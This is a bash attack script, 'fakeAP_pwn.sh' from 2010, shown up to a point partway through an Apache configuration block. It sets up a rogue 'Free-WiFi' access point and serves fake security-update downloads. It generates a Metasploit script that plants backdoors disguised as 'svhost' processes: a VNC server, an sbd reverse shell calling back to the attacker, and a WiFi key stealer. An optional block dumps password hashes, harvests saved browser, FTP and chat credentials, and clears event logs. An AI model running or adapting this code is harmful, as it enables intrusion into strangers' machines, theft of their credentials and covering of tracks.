#!/bin/bash                                                                                    #
# (C)opyright 2010 - g0tmi1k & joker5bb                                                        #
# fakeAP_pwn.sh (v0.3-RC32 2010-07-15)                                                         #
#---Important----------------------------------------------------------------------------------#
# Make sure to copy "www": cp -rf www/* /var/www/fakeAP_pwn                                    #
# The VNC password is "g0tmi1k" (without "")                                                   #
#---ToDo---------------------------------------------------------------------------------------#
# v0.4 - HostAP           - Add support for HostAP & Hardware AP                               #
# v0.4 - Multiple clients - Each time a new client connects they will be redirected to our     #
#                           crafted page without affecting any other clients who are browsing  #
#                           Create a captive portal with:                                      #
#                               -CoovaChilli                                                   #
#                               -FreeRadius                                                    #
#                               -MySQL                                                         #
# v0.4 - Firewall Rules   - Don't expose local machines from the internet interface            #
# v0.5 - Java exploit     - Different "delivery system" ;)                                     #
# v0.6 - Linux/OSX/x64    - Make compatible                                                    #
# v0.7 - Clone AP         - Copies SSID & BSSID then kick all connected clients...             #
# v0.8 - S.E.T.           - Social Engineering Toolkit                                         #
#---Ideas--------------------------------------------------------------------------------------#
# Monitor traffic         - That isn't on port 80 before they download the payload             #
#---Dump Pad-----------------------------------------------------------------------------------#
#use vnc.rb                                                                                    #
# not sure if MTU is working                                                                   #
#---Defaults-----------------------------------------------------------------------------------#
export            ESSID="Free-WiFi"                  # WiFi Name to use
export    fakeAPchannel=1                            # Channel to use
export        interface=eth0                         # The interface you use to surf the internet (Use ifconfig!)
export    wifiInterface=wlan0                        # The interface you want to use for the fake AP (must support monitor mode!) (Use iwconfig!)
export monitorInterface=mon0                         # The interface airmon-ng creates (Use ifconfig!)
export          payload=wkv                          # sbd/vnc/wkv/other - What to upload to the user. vnc=remote desktop, sbd=cmd line, wkv=Steal all WiFi keys
export     backdoorPath=/root/backdoor.exe           # ...Only used when payload is set to "other"
export   metasploitPath=/opt/metasploit3/bin         # Metasploit directory. No trailing slash.
export       htdocsPath=/var/www/fakeAP_pwn          # The directory location to the crafted web page. No trailing slash.
export              mtu=1500                         # 1500/1800/xxxx - If your having timing out problems, change this.
export           apMode=transparent                  # normal/transparent/non - Normal = Doesn't force them, just sniff. Transparent = after been infected gives them internet. non = No internet access afterwards
export      respond2All=false                        # true/false - Respond to every WiFi probe request? true = yes, false = no
export        fakeAPmac=set                          # random/set/false - Change the FakeAP MAC Address?
export       macAddress=00:05:7c:9a:58:3f            # XX:XX:XX:XX:XX:XX  - Use this MAC Address (...Only used when fakeAPmac is "set")
export           extras=false                        # true/false - Runs extra programs after session is created
export            debug=false                        # true/false - If you're having problems
export          verbose=0                            # 0/1/2      - Verbose mode. Displays exactly whats going on. 0=nothing, 1 = info, 2 = inf + commands
#---Settings-----------------------------------------------------------------------------------#
export gatewayIP=`route -n | awk '/^0.0.0.0/ {getline; print $2}'`
export     ourIP=`ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}'`
export      port=`shuf -i 2000-65000 -n 1`
export   version="0.3-RC32"
trap 'cleanup interrupt' 2 # Interrupt - "Ctrl + C"
#----Functions---------------------------------------------------------------------------------#
function cleanup() {
   echo
   echo -e "\e[01;32m[>]\e[00m Cleaning up..."
   if [ $1 != "clean" ]; then $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Monitor Mode (Stopping)" -e "killall xterm" ; fi
   if [ "$debug" != "true" ]; then
      if test -e /tmp/fakeAP_pwn.rb;    then rm /tmp/fakeAP_pwn.rb; fi
      if test -e /tmp/fakeAP_pwn.dhcp;  then rm /tmp/fakeAP_pwn.dhcp; fi
      if test -e /tmp/fakeAP_pwn.wkv;   then rm /tmp/fakeAP_pwn.wkv; fi
      if test -e /tmp/fakeAP_pwn.lock;  then rm /tmp/fakeAP_pwn.lock; fi
      if test -e dsniff.services;       then rm dsniff.services; fi
      if test -e sslstrip.log;          then rm sslstrip.log; fi
      if test -e /etc/apache2/sites-available/fakeAP_pwn; then
         if [ "$verbose" == "2" ] ; then echo "Command: ls /etc/apache2/sites-available/ | xargs a2dissite fakeAP_pwn && a2ensite default* && /etc/init.d/apache2 stop"; fi
         $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Restoring apache" -e "ls /etc/apache2/sites-available/ | xargs a2dissite fakeAP_pwn && a2ensite default* && /etc/init.d/apache2 stop"
         rm /etc/apache2/sites-available/fakeAP_pwn
      fi
      if test -e $htdocsPath/kernal_1.83.90-5+lenny2_i386.deb; then rm $htdocsPath/kernal_1.83.90-5+lenny2_i386.deb; fi
      if test -e $htdocsPath/SecurityUpdate1-83-90-5.dmg.bin;  then rm $htdocsPath/SecurityUpdate1-83-90-5.dmg.bin; fi
      if test -e $htdocsPath/Windows-KB183905-x86-ENU.exe;     then rm $htdocsPath/Windows-KB183905-x86-ENU.exe; fi
      if [ $1 != "clean" ]; then
         command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
         if [ "$command" == "$monitorInterface" ]; then
            sleep 3 # Some times it needs to catch up/wait
            if [ "$verbose" == "2" ] ; then echo "Command: airmon-ng stop $monitorInterface"; fi
            $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Monitor Mode (Stopping)" -e "airmon-ng stop $monitorInterface"
         fi
      fi
      if [ `echo route | egrep "10.0.0.0"` ]; then route del -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1; fi
      iptables --flush
      iptables --table nat --flush
      iptables --delete-chain
      iptables --table nat --delete-chain
      echo "0" > /proc/sys/net/ipv4/ip_forward
   fi
   echo -e "\e[01;36m[>]\e[00m Done! (= Have you... g0tmi1k?"
   exit 0
}
function help() {
   echo "(C)opyright 2010 g0tmi1k & joker5bb ~ http://g0tmi1k.blogspot.com

 Usage: bash fakeAP_pwn.sh -e [essid] -c [channel] -i [interface] -w [interface]
             -m [interface]  -p [sbd/vnc/other] -b [/path] -s [/path] -h [/path] -t [MTU]
             -o [normal/transparent/non] -r (-z / -a [mac address]) -e -d -v -V [-u] [-?]

 Common options:
   -e  ---  WiFi Name e.g. Free-WiFi
   -c  ---  Set the channel for the FakeAP to run on e.g. 6

   -i  ---  Internet Interface (which inferface to use - check with ifconfig)  e.g. eth0
   -w  ---  WiFi Interface (which inferface to use - check with ifconfig)  e.g. wlan0
   -m  ---  Monitor Interface (which inferface to use - check with ifconfig)  e.g. mon0

   -p  ---  Payload (sbd/vnc/wkv/other) e.g. vnc
   -b  ---  Backdoor Path (only used when payload is set to other) e.g. /path/to/backdoor.exe
   -s  ---  Metasploit Path (Where is metasploit is located) e.g. /pentest/exploits/framework3 (No trailing slash.)
   -h  ---  htdocs path e.g. /var/www/fakeAP_pwn. (No trailing slash.)

   -t  ---  Maximum Transmission Unit - If your having timing out problems, change this. e.g. 1500
   -o  ---  Ap Mode. normal/transparent/nontransparent e.g. transparent
   -r  ---  Respond to every probe request
   -z  ---  Randomizes the MAC Address of the FakeAP
   -a  ---  Use this MAC Address. e.g. 00:05:7c:9a:58:3f

   -x  ---  Does a few \"extra\" things after target is infected.
   -d  ---  Debug Mode (Doesn't close any pop up windows)
   -v  ---  Verbose mode (Displays infomation)
   -V  ---  (Higher) Verbose mode (Displays infomation + commands)
   -u  ---  Update fakeAP_pwn
   -?  ---  This screen

 Known issues:
   -\"Odd\" SSID
        Airbase-ng has a few bugs... Just re run...
   -Can't connect
        Airbase-ng has a few bugs... Just re run...(try with -v)
   -No IP
        Get the latest version of dhcp3-server
   -Slow
        Try a different MTU value.
        Don't use a virtual machines
        Your hardware - Wireless N doesnt work too well!
"
   exit 1
}
function update() {
   #svn checkout http://fakeap-pwn.googlecode.com/svn/
   #svn update
   #wget http://fakeap-pwn.googlecode.com/ fakeAP_pwn.tar.gz

   svn export -q --force http://fakeap-pwn.googlecode.com/svn/trunk/fakeAP_pwn.sh fakeAP_pwn.sh
   echo -n -e "\e[01;36m[>]\e[00m Updated to " && svn info | grep Revision: | awk '{print }'
   exit 2
}
#----------------------------------------------------------------------------------------------#
echo -e "\e[01;36m[*]\e[00m g0tmilk's fakeAP_pwn v$version"

while getopts "e:c:i:w:m:p:b:s:h:t:o:rz:a:xdvVu?" OPTIONS; do
  case ${OPTIONS} in
    e     ) export ESSID=$OPTARG;;
    c     ) export fakeAPchannel=$OPTARG;;
    i     ) export interface=$OPTARG;;
    w     ) export wifiInterface=$OPTARG;;
    m     ) export monitorInterface=$OPTARG;;
    p     ) export payload=$OPTARG;;
    b     ) export backdoorPath=$OPTARG;;
    s     ) export metasploitPath=$OPTARG;;
    h     ) export htdocsPath=$OPTARG;;
    t     ) export mtu=$OPTARG;;
    o     ) export apMode=$OPTARG;;
    r     ) export respond2All="true";;
    z     ) export fakeAPmac=$OPTARG;;
    a     ) export macAddress=$OPTARG;;
    x     ) export extras="true";;
    d     ) export debug="true";;
    v     ) export verbose="1";;
    V     ) export verbose="2";;
    u     ) update;;
    ?     ) help;;
    *     ) echo -e "\e[00;31m[-]\e[00m Unknown option.";;   # DEFAULT
  esac
done
#----------------------------------------------------------------------------------------------#
echo -e "\e[01;32m[>]\e[00m Checking environment..."

if [ "$debug" == "true" ]; then
   export xterm="xterm -hold"
   echo -e "\e[00;31mDebug Mode\e[00m"
else
   export xterm="xterm"
fi

if [ "$debug" == "true" ] || [ "$verbose" != "0" ] ; then
    echo -e "\e[01;33m[i]\e[00m            ESSID=$ESSID
\e[01;33m[i]\e[00m    fakeAPchannel=$fakeAPchannel
\e[01;33m[i]\e[00m        interface=$interface
\e[01;33m[i]\e[00m    wifiInterface=$wifiInterface
\e[01;33m[i]\e[00m monitorInterface=$monitorInterface
\e[01;33m[i]\e[00m          payload=$payload
\e[01;33m[i]\e[00m     backdoorPath=$backdoorPath
\e[01;33m[i]\e[00m   metasploitPath=$metasploitPath
\e[01;33m[i]\e[00m    htdocsPath=$htdocsPath
\e[01;33m[i]\e[00m              mtu=$mtu
\e[01;33m[i]\e[00m           apMode=$apMode
\e[01;33m[i]\e[00m      respond2All=$respond2All
\e[01;33m[i]\e[00m        fakeAPmac=$fakeAPmac
\e[01;33m[i]\e[00m           extras=$extras
\e[01;33m[i]\e[00m            debug=$debug
\e[01;33m[i]\e[00m          verbose=$verbose
\e[01;33m[i]\e[00m        gatewayIP=$gatewayIP
\e[01;33m[i]\e[00m            ourIP=$ourIP
\e[01;33m[i]\e[00m             port=$port"
fi

if [ "$(id -u)" != "0" ]; then echo -e "\e[00;31m[-]\e[00m Not a superuser." 1>&2; cleanup; fi

if [ "$apMode" != "non" ]; then
   command=$(ifconfig | grep $interface | awk '{print $1}')
   if [ "$command" != "$interface" ]; then
      echo -e "\e[00;31m[-]\e[00m The gateway interface $interface, isn't correct." 1>&2
      if [ "$debug" == "true" ]; then ifconfig; fi
      cleanup
   fi
   if [ -z "$ourIP" ]; then
      if [ "$verbose" == "2" ]; then echo "Command: dhclient $interface"; fi
      $xterm -geometry 75x15+100+0 -T "fakeAP_pwn v$version - Acquiring an IP Address" -e "dhclient $interface"
      sleep 3
      export ourIP=`ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}'`
      if [ -z "$ourIP" ]; then
         echo -e "\e[00;31m[-]\e[00m IP Problem. Haven't got a IP address on $interface. Try running the script again, once you have!"  1>&2
         export pidcheck=`ps aux | grep $interface | awk '!/grep/ && !/awk/ {print $2}' | while read line; do echo -n "$line "; done | awk '{print}'`
         if [ -n "$pidcheck" ]; then
            kill $pidcheck # Kill dhclient on the internet interface after it fails to get ip, to prevent errors in restarting the script
         fi
         cleanup
      fi
   fi
fi

command=$(ifconfig -a | grep $wifiInterface | awk '{print $1}')
if [ "$command" != "$wifiInterface" ]; then
   echo -e "\e[00;31m[-]\e[00m The wireless interface $wifiInterface, isn't correct." 1>&2
   if [ "$debug" == "true" ]; then iwconfig; fi
   cleanup
fi

if [ "$ESSID" == "" ]; then echo -e "\e[00;31m[-]\e[00m ESSID can't be blank" 1>&2; cleanup; fi
if [ "$fakeAPchannel" == "" ]; then echo -e "\e[00;31m[-]\e[00m fakeAPchannel can't be blank" 1>&2; cleanup; fi
if [ "$payload" != "sbd" ] && [ "$payload" != "vnc" ] && [ "$payload" != "wkv" ] && [ "$payload" != "other" ]; then echo -e "\e[00;31m[-]\e[00m payload isn't correct" 1>&2; cleanup; fi
if [ "$apMode" != "normal" ] && [ "$apMode" != "transparent" ] && [ "$apMode" != "non" ]; then echo -e "\e[00;31m[-]\e[00m apMode isn't correct" 1>&2; cleanup; fi
if [ "$respond2All" != "true" ] && [ "$respond2All" != "false" ]; then echo -e "\e[00;31m[-]\e[00m respond2All isn't correct" 1>&2; cleanup; fi
if [ "$fakeAPmac" != "random" ] && [ "$fakeAPmac" != "set" ] && [ "$fakeAPmac" != "false" ]; then echo -e "\e[00;31m[-]\e[00m fakeAPmac isn't correct" 1>&2; cleanup; fi
if ! [ `echo $macAddress | egrep "^([0-9a-fA-F]{2}\:){5}[0-9a-fA-F]{2}$"` ]; then echo -e "\e[00;31m[-]\e[00m macAddress isn't correct" 1>&2; cleanup; fi
if [ "$extras" != "true" ] && [ "$extras" != "false" ]; then echo -e "\e[00;31m[-]\e[00m extras isn't correct" 1>&2; cleanup; fi
if [ "$debug" != "true" ] && [ "$debug" != "false" ]; then echo -e "\e[00;31m[-]\e[00m debug isn't correct" 1>&2; cleanup; fi
if [ "$verbose" != "0" ] && [ "$verbose" != "1" ] && [ "$verbose" != "2" ]; then echo -e "\e[00;31m[-]\e[00m verbose isn't correct" 1>&2; cleanup; fi

if [ ! -e /usr/sbin/airmon-ng ] && [ ! -e /usr/local/sbin/airmon-ng ] ; then echo -e "\e[00;31m[-]\e[00m aircrack-ng isn't installed. Try: apt-get install aircrack-ng" 1>&2; cleanup; fi
if ! test -e /usr/bin/macchanger; then echo -e "\e[00;31m[-]\e[00m macchanger isn't installed. Try: apt-get install macchanger" 1>&2; cleanup; fi
#if ! test -e /usr/bin/imsniff; then    echo -e "\e[00;31m[-]\e[00m imsniff isn't installed. Try: apt-get install imsniff" 1>&2; cleanup; fi
if ! test -e /usr/sbin/dhcpd3; then    echo -e "\e[00;31m[-]\e[00m dhcpd3 isn't installed. Try: apt-get install dhcp3-server" 1>&2; cleanup; fi
if ! [ -d "$metasploitPath" ]; then    echo -e "\e[00;31m[-]\e[00m metasploit isn't at $metasploitPath. Try: apt-get install metasploit OR apt-get install framework3" 1>&2; cleanup; fi
if ! test -e /usr/sbin/apache2; then   echo -e "\e[00;31m[-]\e[00m apache2 isn't installed. Try: apt-get install apache2 php" 1>&2; cleanup; fi
if [ "$payload" == "other" ]; then
   if ! [ -e "$backdoorPath" ]; then
      echo -e "\e[00;31m[-]\e[00m There isn't a backdoor at $backdoorPath." 1>&2
      cleanup
   fi
fi

if test -e /tmp/fakeAP_pwn.wkv; then rm /tmp/fakeAP_pwn.wkv; fi

if ! test -e "$htdocsPath/index.php"; then
   if test -d "www/"; then
      mkdir -p $htdocsPath
      if [ "$verbose" == "2" ] ; then echo "Command: cp -rf www/* $htdocsPath/"; fi
      $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Copying www/" -e "cp -rf www/* $htdocsPath/"
   fi
   if ! test -e "$htdocsPath/index.php"; then
      echo -e "\e[00;31m[-]\e[00m Missing index.php. Did you run: cp -rf www/* $htdocsPath/" 1>&2
      cleanup
   fi
fi

#----------------------------------------------------------------------------------------------#
echo -e "\e[01;32m[>]\e[00m Stopping services and programs..."
if [ "$verbose" == "2" ] ; then echo "Command: killall dhcpd3 apache2 airbase-ng wicd-client"; fi
$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'Programs'" -e "killall dhcpd3 apache2 airbase-ng wicd-client"   # Killing "wicd-client" to prevent channel hopping
if [ "$verbose" == "2" ] ; then echo "Command: /etc/init.d/dhcp3-server stop"; fi
$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'DHCP3 Service'"   -e "/etc/init.d/dhcp3-server stop"            # Stopping DHCP Server
if [ "$verbose" == "2" ] ; then echo "Command: /etc/init.d/apache2 stop"; fi
$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'Apache2 Service'" -e "/etc/init.d/apache2 stop"                 # Stopping apache Web Server
if [ "$verbose" == "2" ] ; then echo "Command: /etc/init.d/wicd stop"; fi
$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'WICD Service'" -e "/etc/init.d/wicd stop"                       # Stopping WICD
if [ "$verbose" == "2" ] ; then echo "Command: service network-manager stop"; fi
$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'network-manager'" -e "service network-manager stop"            # Stopping network-manager (only for Ubuntu)

#----------------------------------------------------------------------------------------------#
echo -e "\e[01;32m[>]\e[00m Setting up wireless card..."
command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
if [ "$command" == "$monitorInterface" ]; then
   if [ "$verbose" == "2" ] ; then echo "Command: airmon-ng stop $monitorInterface"; fi
   $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Monitor Mode (Stopping)" -e "airmon-ng stop $monitorInterface"
   sleep 1
fi
if [ "$verbose" == "2" ] ; then echo "Command: ifconfig $wifiInterface down"; fi
$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Bringing down $wifiInterface" -e "ifconfig $wifiInterface down" &
sleep 1
if [ "$verbose" == "2" ] ; then echo "Command: ifconfig $wifiInterface up"; fi
$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Bringing up $wifiInterface" -e "ifconfig $wifiInterface up"
export pidcheck2=`ps aux | grep $wifiInterface | awk '!/grep/ && !/awk/ {print $2}' | while read line; do echo -n "$line "; done | awk '{print}'`
if [ -n "$pidcheck2" ]; then
   if [ "$verbose" == "2" ] ; then echo "Command: kill $pidcheck2"; fi
   kill $pidcheck2 # Kill everything on the wifi interface before starting monitor mode, to prevent interference
fi
if [ "$verbose" == "2" ] ; then echo "Command: airmon-ng start $wifiInterface"; fi
$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Monitor Mode (Starting)" -e "airmon-ng start $wifiInterface"
sleep 1
ifconfig mon0 mtu $mtu                                                             # Changes MTU for FakeAP
command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
if [ "$command" != "$monitorInterface" ]; then
   sleep 5 # Some people need to wait a little bit longer, some don't. Don't force the ones that don't need it!
   command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
   if [ "$command" != "$monitorInterface" ]; then
      echo -e "\e[00;31m[-]\e[00m The monitor interface $monitorInterface, isn't correct." 1>&2
      if [ "$debug" == "true" ]; then iwconfig; fi
      cleanup
   fi
fi

#command=$(aireplay-ng --test $monitorInterface)
#if [ `echo $command | grep "Found 0 APs"` ]; then echo -e "\e[00;31m[-]\e[00m Couldn't test packet injection" 1>&2;
#elif ! [ `echo $command | egrep "Injection is working"` ]; then
   #echo -e "\e[00;31m[-]\e[00m The monitor interface $monitorInterface, doesn't support packet injecting." 1>&2
   #cleanup
#fi

#----------------------------------------------------------------------------------------------#
if [ "$fakeAPmac" == "random" ]; then
   echo -e "\e[01;32m[>]\e[00m Changing MAC Address..."
   if [ "$verbose" == "2" ] ; then echo "Command: ifconfig $monitorInterface down && macchanger -A $monitorInterface && ifconfig $monitorInterface up"; fi
   $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Changing MAC Address of FakeAP" -e "ifconfig $monitorInterface down && macchanger -A $monitorInterface && ifconfig $monitorInterface up" &
   sleep 2
fi
if [ "$fakeAPmac" == "set" ]; then
   echo -e "\e[01;32m[>]\e[00m Changing MAC Address..."
   if [ "$verbose" == "2" ] ; then echo "Command: ifconfig $monitorInterface down && macchanger -m $macAddress $monitorInterface && ifconfig $monitorInterface up"; fi
   $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Changing MAC Address of FakeAP" -e "ifconfig $monitorInterface down && macchanger -m $macAddress $monitorInterface && ifconfig $monitorInterface up" &
   sleep 2
fi
if [ "$debug" == "true" ] || [ "$verbose" != "0" ] ; then
    macAddress=$(macchanger --show $monitorInterface | awk -F " " '{print $3}')
    macAddressType=$(macchanger --show $monitorInterface | awk -F "Current MAC: " '{print $2}')
    echo -e "\e[01;33m[i]\e[00m       macAddress=$macAddressType"
fi

#----------------------------------------------------------------------------------------------#
echo -e "\e[01;32m[>]\e[00m Creating scripts..."
# metasploit script
if test -e /tmp/fakeAP_pwn.rb; then rm /tmp/fakeAP_pwn.rb; fi
echo "# Id: fakeAP_pwn.rb v$version
# Author: g0tmi1k at http://g0tmi1k.blogspot.com


################## Variable Declarations ##################
@client   = client
host,port = session.tunnel_peer.split(':')
os        = @client.sys.config.sysinfo['OS']
host      = @client.sys.config.sysinfo['Computer']
arch      = @client.sys.config.sysinfo['Architecture']
user      = @client.sys.config.getuid
date      = Time.now.strftime(\"%Y-%m-%d.%H:%M:%S\")
uac       = 0

######################## Functions ########################
def doLinux
	print_status(\"Coming soon...\")
end

def doOSX
	print_status(\"Coming soon...\")
end

def doWindows(uac)
	session.response_timeout=120
	begin"> /tmp/fakeAP_pwn.rb
if [ "$payload" == "vnc" ]; then
   echo "		print_status(\"   Stopping: winvnc.exe\")
		session.sys.process.execute(\"cmd.exe /C taskkill /IM svhost101.exe /F\", nil, {'Hidden' => true})
		sleep(1)

		print_status(\"  Uploading: VNC\")
		exec = upload(session,\"$htdocsPath/winvnc.exe\",\"svhost101.exe\",\"\")
		upload(session,\"$htdocsPath/vnchooks.dll\",\"vnchooks.dll\",\"\")
		upload(session,\"$htdocsPath/vnc.reg\",\"vnc.reg\",\"\")
		sleep(1)

		print_status(\"Configuring: VNC\")
		execute(session,\"cmd.exe /C regedit.exe /S %TEMP%\vnc.reg\", nil)
		sleep(1)

		if uac == 1
			print_status(\"    Waiting: 30 seconds for target to click \\\"yes\\\"\")
			sleep(30)
		end

		print_status(\"  Executing: winvnc.exe (#{exec})\")
		execute(session,\"cmd.exe /C #{exec} -kill -run\", nil)
		sleep(1)

		print_status(\"Configuring: VNC (Reserving connection).\")
		execute(session,\"cmd.exe /C #{exec} -connect 10.0.0.1\", nil)

		print_status(\"   Deleting: Traces\")
		delete(session, \"%SystemDrive%\\\vnc.reg\")" >> /tmp/fakeAP_pwn.rb
elif [ "$payload" == "sbd" ]; then
   echo "		print_status(\" Stopping: sbd.exe\")
		session.sys.process.execute(\"cmd.exe /C taskkill /IM svhost102.exe /F\", nil, {'Hidden' => true})
		sleep(1)

		print_status(\"Uploading: SecureBackDoor\")
		exec = upload(session,\"$htdocsPath/sbd.exe\",\"svhost102.exe\",\"\")
		sleep(1)

		print_status(\"Executing: sbd.exe (#{exec})\")
		execute(session,\"cmd.exe /C #{exec} -q -r 10 -k g0tmi1k -e cmd -p $port 10.0.0.1\", nil)" >> /tmp/fakeAP_pwn.rb
elif [ "$payload" == "wkv" ]; then
   echo "	print_status(\"  Uploading: Wireless Key Viewer\")
		if @client.sys.config.sysinfo['Architecture'] =~ (/x64/)
			exec = upload(session,\"$htdocsPath/wkv-x64.exe\",\"\",\"\")
		else
			exec = upload(session,\"$htdocsPath/wkv-x86.exe\",\"\",\"\")
		end
		sleep(1)

		print_status(\"  Executing: wkv.exe (#{exec})\")
		execute(session,\"cmd.exe /C #{exec} /stabular %TEMP%\\\wkv.txt\", nil)
		sleep(1)

		if uac == 1
			print_status(\"    Waiting: 30 seconds for target to click \\\"yes\\\"\")
			sleep(30)
		end

		# Check for file!
		print_status(\"Downloading: WiFi keys (/tmp/fakeAP_pwn.wkv)\")
		session.fs.file.download_file(\"/tmp/fakeAP_pwn.wkv\", \"%TEMP%\\\wkv.txt\")

		print_status(\"   Deleting: Traces\")
		delete(session, exec)
		delete(session, \"%TEMP%\\\wkv.txt\")" >> /tmp/fakeAP_pwn.rb
else
   echo "		print_status(\"Stopping: backdoor.exe\")
		session.sys.process.execute(\"cmd.exe /C taskkill /IM svhost103.exe /F\", nil, {'Hidden' => true})
		sleep(1)

		print_status(\"Uploading: backdoor.exe ($backdoorPath)\")
		exec = upload(session,\"$backdoorPath\",\"svhost103.exe\",\"\")
		sleep(1)

		print_status(\"Executing: backdoor.exe\")
		execute(session,\"cmd.exe /C #{exec}\", nil)" >> /tmp/fakeAP_pwn.rb
fi
echo "		sleep(1)

	rescue ::Exception => e
		print_status(\"Error: #{e.class} #{e}\")
	end
end

def upload(session,file,filename = \"\",trgloc = \"\")
	if not ::File.exists?(file)
		raise \"File to upload does not exists!\"
	else
		if trgloc == \"\"
			location = session.fs.file.expand_path(\"%TEMP%\")
		else
			location = trgloc
		end
		begin
			if filename == \"\"
				ext = file[file.rindex(\".\") .. -1]
				if ext and ext.downcase == \".exe\"
					fileontrgt = \"#{location}\\\svhost#{rand(100)}.exe\"
				else
					fileontrgt = \"#{location}\\\TMP#{rand(100)}#{ext}\"
				end
			else
				fileontrgt = \"#{location}\\\#{filename}\"
			end
			session.fs.file.upload_file(\"#{fileontrgt}\",\"#{file}\")
		rescue ::Exception => e
			print_status(\"Error uploading file #{file}: #{e.class} #{e}\")
		end
	end
	return fileontrgt
end

def execute(session,cmdexe,opt)
	r=''
	session.response_timeout=120
	begin
		r = session.sys.process.execute(cmdexe, opt, {'Hidden' => true, 'Channelized' => false})
		r.close
	rescue ::Exception => e
		print_status(\"Error Running Command #{cmdexe}: #{e.class} #{e}\")
	end
end

def delete(session, path)
   r = session.sys.process.execute(\"cmd.exe /c del /F /S /Q \" + path, nil, {'Hidden' => 'true'})
   while(r.name)
      select(nil, nil, nil, 0.10)
   end
   r.close
end

def checkUAC(session)
	begin
		open_key = session.sys.registry.open_key(HKEY_LOCAL_MACHINE,\"SOFTWARE\\\Microsoft\\\Windows\\\CurrentVersion\\\Policies\\\System\", KEY_READ)
		value = open_key.query_value(\"EnableLUA\").data
	rescue ::Exception => e
		print_status(\"Error Checking UAC: #{e.class} #{e}\")
	end
	return (value)
end


########################### Main ##########################
print_line(\"[*] g0tmi1k's fakeAP_pwn $version\")" >> /tmp/fakeAP_pwn.rb
#if [ "$debug" == "true" ] || [ "$verbose" != "0" ] ; then
echo "print_status(\"-------------------------------------------\")
print_status(\"Date: #{date}\")
print_status(\"  IP: #{host}:#{port}\")
print_status(\"  OS: #{os}\")
if os =~ (/Windows Vista/) || os =~ (/Windows 7/)
	uac = checkUAC(session)
	if uac == 1
		print_error(\" UAC: Enabled\")
		session.core.use(\"priv\")
	else
		print_status(\" UAC: Disabled\")
	end
end
print_status(\"Arch: #{arch}\")
print_status(\"Host: #{host}\")
print_status(\"User: #{user}\")
print_status(\"Mode: $payload\")
print_status(\"-------------------------------------------\")" >> /tmp/fakeAP_pwn.rb
#fi
echo "if os =~ /Linux/
	doLinux
elsif os =~ /OSX/
	doOSX
elsif os =~ /Windows/
#	run getcountermeasure.rb -d
	doWindows(uac)
else
	print_error(\"Unsupported OS\")
	exit
end

print_status(\"Unlocking: fakeAP_pwn\")
output = ::File.open(\"/tmp/fakeAP_pwn.lock\", \"a\")
output.puts(\"g0tmi1k\")
output.close
sleep(1)" >> /tmp/fakeAP_pwn.rb

if [ "$debug" == "true" ] || [ "$extras" == "true" ] ; then
echo "print_status(\"-------------------------------------------\")
print_status(\"Extras\")
screenshot
#----
use priv #(session.core.use(\"priv\"))
getsystem
#hashdump #> /tmp/fakeAP_Pwn.hash
hashes = session.priv.sam_hashes
   begin
      session.core.use(\"priv\")
      hashes = session.priv.sam_hashes
      print_status(\"Capturing windows hashes ...\")
      File.open(File.join(logs, \"hashes.txt\"), \"w\") do |fd|
         hashes.each do |user|
            fd.puts(user.to_s)
         end
      end
   rescue ::Exception => e
      print_status(\"Error dumping hashes: #{e.class} #{e}\")
   end
#----
sysinfo
ps
ipconfig
route
#enumdesktops
#getdesktop
#setdesktop
#----
run checkvm.rb
run dumplinks.rb -e
run enum_firefox.rb
run enum_logged_on_users.rb -c -l
run enum_putty.rb
run get_application_list.rb
run getcountermeasure.rb -d -k
run get_env.rb
run get_filezilla_creds.rb -c
run get_loggedon_users.rb -c -l
run get_pidgin_creds.rb -b -c -l
run getvncpw.rb
#run killav.rb
run remotewinenum.rb
run scraper.rb
run winenum.rb -r
#----
clearev
print_status(\"-------------------------------------------\")" >> /tmp/fakeAP_pwn.rb
fi
echo "

print_line(\"[*] Done!\")" >> /tmp/fakeAP_pwn.rb
if [ "$verbose" == "2" ] ; then echo "Created: /tmp/fakeAP_pwn.rb"; fi
if [ "$debug" == "true" ]; then cat /tmp/fakeAP_pwn.rb ; fi

# dhcp script
if test -e /tmp/fakeAP_pwn.dhcp; then rm /tmp/fakeAP_pwn.dhcp; fi
echo "# g0tmi1k - fakeAP_pwn.dhcp v$version
ddns-update-style interim;
ignore client-updates; # Ignore all client requests for DDNS update
authoritative;
default-lease-time 86400; # 24 hours
max-lease-time 172800; # 48 hours
log-facility local7;

subnet 10.0.0.0 netmask 255.255.255.0 {
  range 10.0.0.150 10.0.0.250;
  option routers 10.0.0.1;
  option subnet-mask 255.255.255.0;
  option broadcast-address 10.0.0.255;
  option domain-name \"Home.com\";
  option domain-name-servers $gatewayIP;   # OR    option domain-name-servers 10.0.0.1;
  option netbios-name-servers 10.0.0.99; # The NetBIOS name server (WINS)
}" > /tmp/fakeAP_pwn.dhcp
if [ "$verbose" == "2" ] ; then echo "Created: /tmp/fakeAP_pwn.dhcp"; fi
if [ "$debug" == "true" ]; then cat /tmp/fakeAP_pwn.dhcp; fi

# apache - virtual host
if test -e /etc/apache2/sites-available/fakeAP_pwn; then rm /etc/apache2/sites-available/fakeAP_pwn; fi
echo "<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	DocumentRoot $htdocsPath
	ServerName \"10.0.0.1\"
	<Directory />
		Options FollowSymLinks
		AllowOverride None
	</Directory>
	<Directory $htdocsPath>
		Options Indexes FollowSymLinks MultiViews
		AllowOverride None
